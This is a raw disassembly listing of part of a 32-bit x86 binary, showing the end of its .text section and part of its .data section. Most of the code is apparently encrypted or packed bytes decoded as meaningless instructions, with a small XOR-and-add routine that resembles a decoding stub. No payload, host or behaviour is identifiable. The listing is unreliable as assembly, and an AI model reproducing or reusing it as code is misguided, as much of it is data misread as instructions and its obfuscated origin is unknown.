  411afa:	jle    0x411b55
  411afc:	es scas eax,DWORD PTR es:[edi]
  411afe:	xchg   ebp,eax
  411aff:	test   eax,0xf3cd3a39
  411b04:	jb     0x411b68
  411b06:	mov    dl,bl
  411b08:	or     al,0xcb
  411b0a:	(bad)  
  411b0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b0c:	int3   
  411b0d:	mov    ch,BYTE PTR [ebp-0x6c]
  411b10:	push   es
  411b11:	pop    esp
  411b12:	inc    esi
  411b13:	dec    BYTE PTR [eax+ebx*1+0x4586b1b9]
  411b1a:	int3   
  411b1b:	xchg   ecx,eax
  411b1c:	hlt    
  411b1d:	mov    esp,0x1301f85f
  411b22:	fisttp QWORD PTR [edx-0x25a4aea5]
  411b28:	inc    ecx
  411b29:	xor    al,0x4d
  411b2b:	ret    0x4f63
  411b2e:	inc    esi
  411b2f:	push   es
  411b30:	mov    al,BYTE PTR [esi+ebp*8+0x2d2fad0f]
  411b37:	icebp  
  411b38:	mul    esp
  411b3a:	jle    0x411ade
  411b3c:	push   eax
  411b3d:	stc    
  411b3e:	test   cl,0xcc
  411b41:	adc    bh,BYTE PTR [ebp-0x3b]
  411b44:	xchg   ecx,eax
  411b45:	cwde   
  411b46:	(bad)  
  411b47:	jmp    0xef1906ab
  411b4c:	rcl    BYTE PTR [edx],0x42
  411b4f:	(bad)
  411b52:	stos   BYTE PTR es:[edi],al
  411b53:	pop    edi
  411b55:	popa   
  411b56:	test   DWORD PTR [ebx+0x7d],esp
  411b59:	inc    ebx
  411b5a:	aaa    
  411b5b:	in     al,0xce
  411b5d:	push   esp
  411b5e:	test   al,0x8e
  411b60:	fwait
  411b61:	sub    eax,0xa131ccbf
  411b66:	mov    dh,0x6c
  411b68:	mov    ah,0x15
  411b6a:	jmp    0x5ea1bb8a
  411b6f:	push   es
  411b70:	mov    ds:0x5d2fb2d1,eax
  411b75:	addr16 inc edx
  411b77:	mov    bl,0x50
  411b79:	ds mov al,0x6f
  411b7c:	mov    edi,0xfe96195d
  411b81:	clc    
  411b82:	and    ecx,ebp
  411b84:	lds    esp,FWORD PTR [eax+0xf]
  411b87:	loop   0x411b80
  411b89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b8a:	jne    0x411bb0
  411b8c:	cmp    al,0x65
  411b8e:	mov    ebp,0x9f9ed380
  411b93:	sub    al,BYTE PTR [esi-0x1332a9af]
  411b99:	mov    DWORD PTR ss:[eax],ebx
  411b9c:	xchg   ebx,eax
  411b9d:	test   al,0xdc
  411b9f:	dec    esi
  411ba0:	lods   eax,DWORD PTR ds:[esi]
  411ba1:	jmp    0xdae8:0xc98f137a
  411ba8:	or     al,0xd6
  411baa:	xchg   esi,eax
  411bab:	adc    eax,0xf4e6aadc
  411bb0:	cs mov dh,0xa4
  411bb3:	ror    BYTE PTR [edi+ebp*8+0x53],cl
  411bb7:	adc    ebx,DWORD PTR [edi+0x5]
  411bba:	add    BYTE PTR [eax],dh
  411bbc:	and    dh,ah
  411bbe:	aaa    
  411bbf:	xchg   ebp,eax
  411bc0:	and    eax,0x84b53b07
  411bc5:	add    al,0xc3
  411bc7:	adc    ax,0x81ef
  411bcb:	pop    ebx
  411bcc:	inc    edx
  411bcd:	mov    DWORD PTR [eax],ebx
  411bcf:	dec    eax
  411bd0:	sar    DWORD PTR [ebp+0x277c3e6f],cl
  411bd6:	pop    cx
  411bd8:	out    0xe0,al
  411bda:	cmp    esp,DWORD PTR [edi]
  411bdc:	lea    edx,fs:[edi]
  411bdf:	xchg   edx,eax
  411be0:	xor    DWORD PTR [ecx],edx
  411be2:	daa    
  411be3:	paddsb mm3,QWORD PTR [edi+0x2]
  411be7:	mov    cl,0xbd
  411be9:	in     eax,0xae
  411beb:	pushf  
  411bec:	push   ebx
  411bed:	push   cs
  411bee:	sbb    edx,DWORD PTR [esi+0x43]
  411bf1:	fwait
  411bf2:	pop    edi
  411bf3:	xor    edi,DWORD PTR [ebx]
  411bf5:	sub    BYTE PTR [eax-0x2b99bf1b],cl
  411bfb:	je     0x411c2f
  411bfd:	mov    ebp,0x3dd031b2
  411c02:	bound  ebp,QWORD PTR [esi+0xee8f489]
  411c08:	pop    esi
  411c09:	jg     0x411be1
  411c0b:	sbb    BYTE PTR [ebx],dl
  411c0d:	in     eax,dx
  411c0e:	inc    esp
  411c0f:	dec    edx
  411c10:	cld    
  411c11:	jb     0x411c56
  411c13:	aad    0xdf
  411c15:	push   ss
  411c16:	aam    0x22
  411c18:	nop
  411c19:	xor    eax,0x6112fbfc
  411c1e:	sub    al,0xe4
  411c20:	int3   
  411c21:	in     al,0xa8
  411c23:	lods   eax,DWORD PTR ds:[esi]
  411c24:	xor    esp,DWORD PTR [eax+0xe713c4f]
  411c2a:	sti    
  411c2b:	xchg   ebx,eax
  411c2c:	sub    BYTE PTR [esi],ch
  411c2e:	inc    esp
  411c2f:	jmp    0x3ee7:0x9f5e9af4
  411c36:	jb     0x411bee
  411c38:	sbb    cl,BYTE PTR [ecx+0xe]
  411c3b:	jecxz  0x411c70
  411c3d:	ret    0x8b56
  411c40:	jne    0x411c4a
  411c42:	mov    ecx,0x32729b
  411c47:	add    eax,ecx
  411c49:	jmp    0x411e84
  411c4e:	mov    WORD PTR [eax-0x1a6d186e],cs
  411c54:	imul   esi,DWORD PTR [ecx-0x48],0x58dad6c4
  411c5b:	dec    esi
  411c5c:	or     dh,cl
  411c5e:	(bad)  
  411c5f:	dec    ebx
  411c60:	jle    0x411ce0
  411c62:	adc    BYTE PTR [esi+edi*2+0x7e],bh
  411c66:	stos   BYTE PTR es:[edi],al
  411c67:	loope  0x411c20
  411c69:	cmp    ch,BYTE PTR ds:0xc97501fd
  411c6f:	cmp    BYTE PTR [ecx+eiz*2],ah
  411c72:	imul   esp,ebp,0x1bb68048
  411c78:	sar    DWORD PTR ds:0xb6adcebe,0x8e
  411c7f:	and    BYTE PTR ds:0x19242550,bh
  411c85:	das    
  411c86:	mov    fs,WORD PTR ds:0xa82bb992
  411c8c:	jle    0x411cc0
  411c8e:	in     al,0x94
  411c90:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c92:	mov    WORD PTR [esi+0x37],fs
  411c95:	push   cs
  411c96:	and    ebp,DWORD PTR [ecx]
  411c98:	mov    ds:0x4e4ecc7c,eax
  411c9d:	aam    0xb1
  411c9f:	or     esi,DWORD PTR [esp+eax*4-0xd2fff7b]
  411ca6:	jo     0x411c3d
  411ca8:	es pop ecx
  411cab:	mov    ch,0x30
  411cad:	call   0xb724a923
  411cb2:	sbb    eax,ebx
  411cb4:	sbb    ebp,ebx
  411cb6:	sub    BYTE PTR [ecx+0x1a],bl
  411cb9:	mov    bh,0x7b
  411cbb:	jb     0x411c82
  411cbd:	fstp   DWORD PTR [edi]
  411cbf:	xchg   esp,eax
  411cc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cc1:	mov    DWORD PTR [edx],eax
  411cc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cc4:	jge    0x411c78
  411cc6:	pop    ss
  411cc7:	or     eax,0x22c9cc68
  411ccc:	mov    ebx,0x7505cabd
  411cd1:	dec    esi
  411cd2:	lods   eax,DWORD PTR ds:[esi]
  411cd3:	pop    edi
  411cd4:	push   edx
  411cd5:	mov    ah,0xf7
  411cd7:	shl    eax,0x2
  411cda:	xor    BYTE PTR [esi+0x41],al
  411cdd:	mov    esi,0xa2edc817
  411ce2:	adc    DWORD PTR [eax+0x1414b207],ebx
  411ce8:	sbb    ebx,eax
  411cea:	call   edx
  411cec:	jg     0x411c76
  411cee:	push   edi
  411cef:	mov    ecx,0xdf20fb55
  411cf4:	int3   
  411cf5:	sbb    bl,ch
  411cf7:	test   bl,0xb7
  411cfa:	(bad)  
  411cfb:	jge    0x411caf
  411cfd:	scas   al,BYTE PTR es:[edi]
  411cfe:	xor    ah,BYTE PTR [ebx+0x7c855176]
  411d04:	pop    esi
  411d05:	pop    ebp
  411d06:	les    eax,FWORD PTR [ebx]
  411d08:	iret   
  411d09:	jno    0x411d01
  411d0b:	xchg   edx,eax
  411d0c:	test   DWORD PTR [eax-0x70],eax
  411d0f:	pop    edx
  411d10:	mov    eax,ds:0x2252e3da
  411d15:	sbb    al,0x10
  411d17:	(bad)  
  411d18:	adc    ch,BYTE PTR [edx+0x4e640f42]
  411d1e:	in     eax,dx
  411d1f:	les    ebp,FWORD PTR [edi]
  411d21:	add    al,0x61
  411d23:	xchg   edx,eax
  411d24:	repz dec ebp
  411d26:	lods   eax,DWORD PTR ds:[esi]
  411d27:	push   edx
  411d28:	fidivr WORD PTR [esi]
  411d2a:	pop    ebx
  411d2b:	mov    al,0x21
  411d2d:	push   cs
  411d2e:	pop    es
  411d2f:	dec    edx
  411d30:	jmp    0x411d6c
  411d32:	mov    eax,DWORD PTR [ebx+0x4c]
  411d35:	das    
  411d36:	lods   al,BYTE PTR ds:[esi]
  411d37:	jl     0x411da7
  411d39:	adc    ah,BYTE PTR [eax-0x7801c8bf]
  411d3f:	pop    es
  411d40:	pop    esi
  411d41:	xchg   ecx,eax
  411d42:	push   ds
  411d43:	jns    0x411dc4
  411d45:	jle    0x411d0f
  411d47:	inc    esi
  411d48:	mov    al,0xf4
  411d4a:	jle    0x411d38
  411d4c:	mov    ebp,0x71813f8c
  411d51:	jnp    0x411cfa
  411d53:	outs   dx,DWORD PTR ds:[esi]
  411d54:	pop    ecx
  411d55:	sbb    eax,0xa941e625
  411d5a:	or     BYTE PTR ds:0xfc7c7a,ah
  411d60:	lahf   
  411d61:	inc    ebx
  411d62:	xchg   ebx,eax
  411d63:	adc    al,0x57
  411d65:	jae    0x411d06
  411d67:	(bad)  
  411d68:	hlt    
  411d69:	or     eax,0x206403f1
  411d6e:	mov    ds,WORD PTR [esi]
  411d70:	push   0x2
  411d72:	mov    WORD PTR [edx-0x61],ss
  411d75:	sbb    BYTE PTR [ebp-0x4e],dl
  411d78:	ret    
  411d79:	aas    
  411d7a:	xchg   edi,eax
  411d7b:	fdivr  DWORD PTR [ebp-0x35]
  411d7e:	or     al,0x75
  411d80:	pop    ss
  411d81:	fnstsw WORD PTR [esi]
  411d83:	ret    
  411d84:	and    BYTE PTR [ecx+0x3d17dec3],0xc3
  411d8b:	nop
  411d8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d8d:	ret    0x9544
  411d90:	xor    al,0x2f
  411d92:	adc    DWORD PTR [edi],ecx
  411d94:	pushf  
  411d95:	adc    eax,0xb1fa7574
  411d9a:	ss push ecx
  411d9c:	push   esi
  411d9d:	sub    cl,BYTE PTR [edi+ebp*2]
  411da0:	aas    
  411da1:	aam    0xf6
  411da3:	outs   dx,DWORD PTR ds:[esi]
  411da4:	int3   
  411da5:	xchg   ebx,eax
  411da6:	jmp    0xe096:0x2674ecfd
  411dad:	test   al,0xa9
  411daf:	stc    
  411db0:	fist   WORD PTR [esp+ebp*4]
  411db3:	repnz stos BYTE PTR es:[edi],al
  411db5:	mov    ebp,edi
  411db7:	add    al,0x7c
  411db9:	or     esi,DWORD PTR [eax-0x74]
  411dbc:	fidivr DWORD PTR [ebx+0x2d]
  411dbf:	sbb    bl,BYTE PTR [ebp+ebx*2+0x67]
  411dc3:	mov    dh,0x3c
  411dc5:	imul   eax,DWORD PTR ds:0x397bee59,0x6e
  411dcc:	aaa    
  411dcd:	leave  
  411dce:	enter  0xb6ed,0x74
  411dd2:	push   ds
  411dd3:	push   0xf18b5c03
  411dd8:	or     eax,0x693b98b3
  411ddd:	sub    eax,0x2dc2dba3
  411de2:	xlat   BYTE PTR ds:[ebx]
  411de3:	xchg   ebp,eax
  411de4:	add    al,0x50
  411de6:	inc    esp
  411de7:	out    0xb0,al
  411de9:	cdq    
  411dea:	push   ecx
  411deb:	inc    eax
  411dec:	into   
  411ded:	mov    BYTE PTR [edi-0xf],dh
  411df0:	push   edx
  411df1:	and    ecx,eax
  411df3:	or     BYTE PTR [edi],dl
  411df5:	add    BYTE PTR [ecx],cl
  411df7:	(bad)  
  411df8:	mov    ds:0x4f9264f,al
  411dfd:	push   ebp
  411dfe:	les    eax,FWORD PTR [edi+0x3d91303d]
  411e04:	pop    ebp
  411e05:	mov    ebx,0xdd0b139f
  411e0a:	cld    
  411e0b:	add    ch,dh
  411e0d:	push   0xe5e03e36
  411e12:	cmp    bh,BYTE PTR [esi+0x4e]
  411e15:	sub    DWORD PTR [edx+edx*8+0x62dde797],ecx
  411e1c:	mov    edi,0xab592136
  411e21:	dec    ecx
  411e22:	dec    ebp
  411e23:	ret    
  411e24:	mov    bl,0x8a
  411e26:	mov    ch,0xea
  411e28:	push   edi
  411e29:	fldenv [edi+0x45]
  411e2c:	sub    eax,0xcc5069af
  411e31:	mov    dl,0x5a
  411e33:	pop    edi
  411e34:	pop    edx
  411e35:	jne    0x411e90
  411e37:	test   eax,0xabc628b1
  411e3c:	loopne 0x411df0
  411e3e:	mov    eax,ds:0x4cb22562
  411e43:	mov    al,ds:0xe999ac32
  411e48:	daa    
  411e49:	push   ecx
  411e4a:	adc    BYTE PTR [edi+0x5c],bh
  411e4d:	pop    ecx
  411e4e:	cli    
  411e4f:	int    0xa5
  411e51:	fistp  DWORD PTR [edx]
  411e53:	fadd   QWORD PTR [ebx]
  411e55:	push   ebx
  411e56:	mov    edx,0x245940c3
  411e5b:	stos   DWORD PTR es:[edi],eax
  411e5c:	lea    esi,[bx+di+0x76]
  411e60:	scas   al,BYTE PTR es:[edi]
  411e61:	add    DWORD PTR [ecx],edx
  411e63:	ss dec ecx
  411e65:	mov    dh,0xc5
  411e67:	loopne 0x411ed0
  411e69:	mov    eax,0xdbff90ad
  411e6e:	std    
  411e6f:	sti    
  411e70:	pop    ebp
  411e71:	ja     0x411e81
  411e73:	sbb    eax,0x3b53e64c
  411e78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e79:	add    eax,0x65701537
  411e7e:	neg    dh
  411e80:	adc    al,0x1c
  411e82:	rcr    BYTE PTR [ebp+0x39],cl
  411e85:	inc    esi
  411e86:	push   esp
  411e87:	pop    esi
  411e88:	je     0x411e96
  411e8e:	mov    eax,DWORD PTR [ebp+0x8]
  411e91:	jmp    0x411eaf
  411e96:	mov    eax,DWORD PTR [ebp-0x4]
  411e99:	xor    eax,edx
  411e9b:	add    eax,ecx
  411e9d:	jmp    0x411eaf
  411ea2:	mov    eax,DWORD PTR [ebp-0x4]
  411ea5:	xor    eax,0x7510854
  411eaa:	add    eax,0x32729b
  411eaf:	leave  
  411eb0:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    BYTE PTR [ecx],0x1
  412003:	add    BYTE PTR [edx-0x5dfffed7],dl
  412009:	sub    DWORD PTR [ecx],eax
  41200b:	add    BYTE PTR [eax-0x41fffed7],dh
  412011:	sub    DWORD PTR [ecx],eax
  412013:	add    ah,dl
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    ah,ah
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    dh,dh
  41201d:	sub    DWORD PTR [ecx],eax
  41201f:	add    BYTE PTR [edx],al
  412021:	sub    al,BYTE PTR [ecx]
  412023:	add    BYTE PTR [edx+ebp*1],dl
  412026:	add    DWORD PTR [eax],eax
  412028:	and    BYTE PTR [edx],ch
  41202a:	add    DWORD PTR [eax],eax
  41202c:	sub    al,BYTE PTR cs:[ecx]
  41202f:	add    BYTE PTR [esi+0x2a],al
  412032:	add    DWORD PTR [eax],eax
  412034:	pop    eax
  412035:	sub    al,BYTE PTR [ecx]
  412037:	add    BYTE PTR [esi+0x2a],ah
  41203a:	add    DWORD PTR [eax],eax
  41203c:	js     0x412068
  41203e:	add    DWORD PTR [eax],eax
  412040:	mov    gs,WORD PTR [edx]
  412042:	add    DWORD PTR [eax],eax
  412044:	sahf   
  412045:	sub    al,BYTE PTR [ecx]
  412047:	add    BYTE PTR [edx-0x35fffed6],dh
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    dh,bl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    dl,ch
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    ah,bh
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx],dl
  41205d:	sub    eax,DWORD PTR [ecx]
  41205f:	add    BYTE PTR [esi],bl
  412061:	sub    eax,DWORD PTR [ecx]
  412063:	add    BYTE PTR [ebx+ebp*1],ch
  412066:	add    DWORD PTR [eax],eax
  412068:	inc    eax
  412069:	sub    eax,DWORD PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2b],cl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    eax,DWORD PTR fs:[ecx]
  412073:	add    BYTE PTR [edx+0x2b],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	test   BYTE PTR [ebx],ch
  41207a:	add    DWORD PTR [eax],eax
  41207c:	mov    gs,WORD PTR [ebx]
  41207e:	add    DWORD PTR [eax],eax
  412080:	sahf   
  412081:	sub    eax,DWORD PTR [ecx]
  412083:	add    BYTE PTR [eax-0x3bfffed5],bh
  412089:	sub    eax,DWORD PTR [ecx]
  41208b:	add    al,dl
  41208d:	sub    eax,DWORD PTR [ecx]
  41208f:	add    ah,ch
  412091:	sub    eax,DWORD PTR [ecx]
  412093:	add    ah,bh
  412095:	sub    eax,DWORD PTR [ecx]
  412097:	add    BYTE PTR [edx],cl
  412099:	sub    al,0x1
  41209b:	add    BYTE PTR [eax],bl
  41209d:	sub    al,0x1
  41209f:	add    BYTE PTR [esp+ebp*1],ah
  4120a2:	add    DWORD PTR [eax],eax
  4120a4:	cmp    BYTE PTR [ecx+eax*1],ch
  4120a7:	add    BYTE PTR [esi+0x2c],cl
  4120aa:	add    DWORD PTR [eax],eax
  4120ac:	pop    edx
  4120ad:	sub    al,0x1
  4120af:	add    BYTE PTR [edx+0x2c],ch
  4120b2:	add    DWORD PTR [eax],eax
  4120b4:	jl     0x4120e2
  4120b6:	add    DWORD PTR [eax],eax
  4120b8:	mov    gs,WORD PTR [ecx+eax*1]
  4120bb:	add    BYTE PTR [eax-0x47fffed4],ah
  4120c1:	sub    al,0x1
  4120c3:	add    al,cl
  4120c5:	sub    al,0x1
  4120c7:	add    dh,dl
  4120c9:	sub    al,0x1
  4120cb:	add    ah,ah
  4120cd:	sub    al,0x1
  4120cf:	add    dh,dh
  4120d1:	sub    al,0x1
  4120d3:	add    BYTE PTR [esi],al
  4120d5:	sub    eax,0x2d140001
  4120da:	add    DWORD PTR [eax],eax
  4120dc:	es sub eax,0x2d3c0001
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	dec    edx
  4120e5:	sub    eax,0x2d5a0001
  4120ea:	add    DWORD PTR [eax],eax
  4120ec:	push   0x2d
  4120ee:	add    DWORD PTR [eax],eax
  4120f0:	je     0x41211f
  4120f2:	add    DWORD PTR [eax],eax
  4120f4:	test   BYTE PTR ds:0x2d900001,ch
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	sahf   
  4120fd:	sub    eax,0x2daa0001
  412102:	add    DWORD PTR [eax],eax
  412104:	mov    eax,0xd000012d
  412109:	sub    eax,0x2dde0001
  41210e:	add    DWORD PTR [eax],eax
  412110:	out    dx,al
  412111:	sub    eax,0x2dfe0001
  412116:	add    DWORD PTR [eax],eax
  412118:	or     al,0x2e
  41211a:	add    DWORD PTR [eax],eax
  41211c:	push   ds
  41211d:	add    DWORD PTR cs:[eax],eax
  412120:	xor    ch,BYTE PTR [esi]
  412122:	add    DWORD PTR [eax],eax
  412124:	dec    esi
  412125:	add    DWORD PTR cs:[eax],eax
  412128:	pop    esi
  412129:	add    DWORD PTR cs:[eax],eax
  41212c:	je     0x41215c
  41212e:	add    DWORD PTR [eax],eax
  412130:	xchg   BYTE PTR [esi],ch
  412132:	add    DWORD PTR [eax],eax
  412134:	call   0x12e:0xac00012e
  41213b:	add    BYTE PTR [esi-0x33fffed2],bh
  412141:	add    DWORD PTR cs:[eax],eax
  412144:	fisubr DWORD PTR [esi]
  412146:	add    DWORD PTR [eax],eax
  412148:	out    dx,al
  412149:	add    DWORD PTR cs:[eax],eax
  41214c:	cli    
  41214d:	add    DWORD PTR cs:[eax],eax
  412150:	push   cs
  412151:	das    
  412152:	add    DWORD PTR [eax],eax
  412154:	push   ds
  412155:	das    
  412156:	add    DWORD PTR [eax],eax
  412158:	cs das 
  41215a:	add    DWORD PTR [eax],eax
  41215c:	inc    eax
  41215d:	das    
  41215e:	add    DWORD PTR [eax],eax
  412160:	pop    eax
  412161:	das    
  412162:	add    DWORD PTR [eax],eax
  412164:	outs   dx,BYTE PTR ds:[esi]
  412165:	das    
  412166:	add    DWORD PTR [eax],eax
  412168:	jle    0x412199
  41216a:	add    DWORD PTR [eax],eax
  41216c:	call   0x12f:0xae00012f
  412173:	add    BYTE PTR [edx-0x39fffed1],bh
  412179:	das    
  41217a:	add    DWORD PTR [eax],eax
  41217c:	aam    0x2f
  41217e:	add    DWORD PTR [eax],eax
  412180:	in     al,0x2f
  412182:	add    DWORD PTR [eax],eax
  412184:	cli    
  412185:	das    
  412186:	add    DWORD PTR [eax],eax
  412188:	or     al,0x30
  41218a:	add    DWORD PTR [eax],eax
  41218c:	push   ss
  41218d:	xor    BYTE PTR [ecx],al
  41218f:	add    BYTE PTR [esi],ch
  412191:	xor    BYTE PTR [ecx],al
  412193:	add    BYTE PTR [edx],bh
  412195:	xor    BYTE PTR [ecx],al
  412197:	add    BYTE PTR [eax+esi*1+0x1],cl
  41219b:	add    BYTE PTR [eax+0x30],bl
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	jb     0x4121d2
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	jle    0x4121d6
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	mov    WORD PTR [eax],?
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	mov    ds:0xb8000130,al
  4121b1:	xor    BYTE PTR [ecx],al
  4121b3:	add    BYTE PTR [eax],al
  4121b5:	add    BYTE PTR [eax],al
  4121b7:	add    ah,dl
  4121b9:	xor    BYTE PTR [ecx],al
  4121bb:	add    al,ch
  4121bd:	xor    BYTE PTR [ecx],al
  4121bf:	add    BYTE PTR [eax],al
  4121c1:	xor    DWORD PTR [ecx],eax
  4121c3:	add    BYTE PTR [esi],dl
  4121c5:	xor    DWORD PTR [ecx],eax
  4121c7:	add    BYTE PTR [esi],ah
  4121c9:	xor    DWORD PTR [ecx],eax
  4121cb:	add    BYTE PTR [ecx+esi*1],dh
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	dec    esp
  4121d1:	xor    DWORD PTR [ecx],eax
  4121d3:	add    BYTE PTR [edx+0x31],bl
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	xor    WORD PTR [ecx],ax
  4121db:	add    BYTE PTR [eax+0x31],bh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xchg   esp,eax
  4121e1:	xor    DWORD PTR [ecx],eax
  4121e3:	add    BYTE PTR [edx-0x49fffecf],ah
  4121e9:	xor    DWORD PTR [ecx],eax
  4121eb:	add    dh,al
  4121ed:	xor    DWORD PTR [ecx],eax
  4121ef:	add    dl,dl
  4121f1:	xor    DWORD PTR [ecx],eax
  4121f3:	add    ah,ah
  4121f5:	xor    DWORD PTR [ecx],eax
  4121f7:	add    ah,ch
  4121f9:	xor    DWORD PTR [ecx],eax
  4121fb:	add    ah,bh
  4121fd:	xor    DWORD PTR [ecx],eax
  4121ff:	add    BYTE PTR [esi],cl
  412201:	xor    al,BYTE PTR [ecx]
  412203:	add    BYTE PTR [edx+esi*1],bl
  412206:	add    DWORD PTR [eax],eax
  412208:	xor    al,BYTE PTR cs:[ecx]
  41220b:	add    BYTE PTR [eax+0x32],al
  41220e:	add    DWORD PTR [eax],eax
  412210:	push   esi
  412211:	xor    al,BYTE PTR [ecx]
  412213:	add    BYTE PTR [esi+0x32],ah
  412216:	add    DWORD PTR [eax],eax
  412218:	js     0x41224c
  41221a:	add    DWORD PTR [eax],eax
  41221c:	mov    dh,BYTE PTR [edx]
  41221e:	add    DWORD PTR [eax],eax
  412220:	call   0x132:0xb0000132
  412227:	add    al,al
  412229:	xor    al,BYTE PTR [ecx]
  41222b:	add    ah,cl
  41222d:	xor    al,BYTE PTR [ecx]
  41222f:	add    dl,ah
  412231:	xor    al,BYTE PTR [ecx]
  412233:	add    ah,dh
  412235:	xor    al,BYTE PTR [ecx]
  412237:	add    BYTE PTR [esi],al
  412239:	xor    eax,DWORD PTR [ecx]
  41223b:	add    BYTE PTR [esi],dl
  41223d:	xor    eax,DWORD PTR [ecx]
  41223f:	add    BYTE PTR [ebx+esi*1],ch
  412242:	add    DWORD PTR [eax],eax
  412244:	cmp    dh,BYTE PTR [ebx]
  412246:	add    DWORD PTR [eax],eax
  412248:	push   eax
  412249:	xor    eax,DWORD PTR [ecx]
  41224b:	add    BYTE PTR [ebx+esi*1+0x1],ah
  41224f:	add    BYTE PTR [edx+0x33],bh
  412252:	add    DWORD PTR [eax],eax
  412254:	cwde   
  412255:	xor    eax,DWORD PTR [ecx]
  412257:	add    BYTE PTR [eax-0x43fffecd],dh
  41225d:	xor    eax,DWORD PTR [ecx]
  41225f:	add    dh,cl
  412261:	xor    eax,DWORD PTR [ecx]
  412263:	add    dl,bl
  412265:	xor    eax,DWORD PTR [ecx]
  412267:	add    dh,ch
  412269:	xor    eax,DWORD PTR [ecx]
  41226b:	add    BYTE PTR [esi],al
  41226d:	xor    al,0x1
  41226f:	add    BYTE PTR [edx],dl
  412271:	xor    al,0x1
  412273:	add    BYTE PTR [eax],ah
  412275:	xor    al,0x1
  412277:	add    BYTE PTR [edx],dh
  412279:	xor    al,0x1
  41227b:	add    BYTE PTR [edx+0x34],al
  41227e:	add    DWORD PTR [eax],eax
  412280:	dec    esp
  412281:	xor    al,0x1
  412283:	add    BYTE PTR [eax],al
  412285:	add    BYTE PTR [eax],al
  412287:	add    BYTE PTR [esi+0x34],ah
  41228a:	add    DWORD PTR [eax],eax
  41228c:	je     0x4122c2
  41228e:	add    DWORD PTR [eax],eax
  412290:	xor    BYTE PTR [ecx+eax*1],0x0
  412294:	xchg   esp,eax
  412295:	xor    al,0x1
  412297:	add    BYTE PTR [eax],al
  412299:	add    BYTE PTR [eax],al
  41229b:	add    BYTE PTR [esi-0x43fffecc],ch
  4122a1:	xor    al,0x1
  4122a3:	add    dh,cl
  4122a5:	xor    al,0x1
  4122a7:	add    ah,bl
  4122a9:	xor    al,0x1
  4122ab:	add    ah,ah
  4122ad:	xor    al,0x1
  4122af:	add    ah,dh
  4122b1:	xor    al,0x1
  4122b3:	add    BYTE PTR [eax],al
  4122b5:	xor    eax,0x350e0001
  4122ba:	add    DWORD PTR [eax],eax
  4122bc:	push   ss
  4122bd:	xor    eax,0x35220001
  4122c2:	add    DWORD PTR [eax],eax
  4122c4:	sub    al,0x35
  4122c6:	add    DWORD PTR [eax],eax
  4122c8:	ss xor eax,0x353e0001
  4122ce:	add    DWORD PTR [eax],eax
  4122d0:	dec    eax
  4122d1:	xor    eax,0x35520001
  4122d6:	add    DWORD PTR [eax],eax
  4122d8:	pop    esp
  4122d9:	xor    eax,0x35680001
  4122de:	add    DWORD PTR [eax],eax
  4122e0:	je     0x412317
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	jle    0x41231b
  4122e6:	add    DWORD PTR [eax],eax
  4122e8:	mov    BYTE PTR ds:0x35920001,dh
  4122ee:	add    DWORD PTR [eax],eax
  4122f0:	mov    al,ds:0xa8000135
  4122f5:	xor    eax,0x35b40001
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	mov    esi,0xc8000135
  412301:	xor    eax,0x35d20001
  412306:	add    DWORD PTR [eax],eax
  412308:	fidiv  WORD PTR ds:0x35ec0001
  41230e:	add    DWORD PTR [eax],eax
  412310:	clc    
  412311:	xor    eax,0x36000001
  412316:	add    DWORD PTR [eax],eax
  412318:	or     al,0x36
  41231a:	add    DWORD PTR [eax],eax
  41231c:	push   ss
  41231d:	add    DWORD PTR ss:[eax],eax
  412320:	and    BYTE PTR [esi],dh
  412322:	add    DWORD PTR [eax],eax
  412324:	sub    BYTE PTR [esi],dh
  412326:	add    DWORD PTR [eax],eax
  412328:	xor    dh,BYTE PTR [esi]
  41232a:	add    DWORD PTR [eax],eax
  41232c:	cmp    al,0x36
  41232e:	add    DWORD PTR [eax],eax
  412330:	inc    esi
  412331:	add    DWORD PTR ss:[eax],eax
  412334:	push   eax
  412335:	add    DWORD PTR ss:[eax],eax
  412338:	pop    edx
  412339:	add    DWORD PTR ss:[eax],eax
  41233c:	fs add DWORD PTR ss:[eax],eax
  412340:	outs   dx,BYTE PTR ds:[esi]
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	xor    BYTE PTR [esi],0x1
  412347:	add    BYTE PTR [edx+0x136],dl
  41234d:	add    BYTE PTR [eax],al
  41234f:	add    BYTE PTR [eax-0x3ffffeca],ch
  412355:	add    DWORD PTR ss:[eax],eax
  412358:	fdiv   DWORD PTR [esi]
  41235a:	add    DWORD PTR [eax],eax
  41235c:	hlt    
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	or     al,0x37
  412362:	add    DWORD PTR [eax],eax
  412364:	and    al,0x37
  412366:	add    DWORD PTR [eax],eax
  412368:	add    BYTE PTR [eax],al
  41236a:	add    BYTE PTR [eax],al
  41236c:	inc    esi
  41236d:	aaa    
  41236e:	add    DWORD PTR [eax],eax
  412370:	pop    esp
  412371:	aaa    
  412372:	add    DWORD PTR [eax],eax
  412374:	jo     0x4123ad
  412376:	add    DWORD PTR [eax],eax
  412378:	jle    0x4123b1
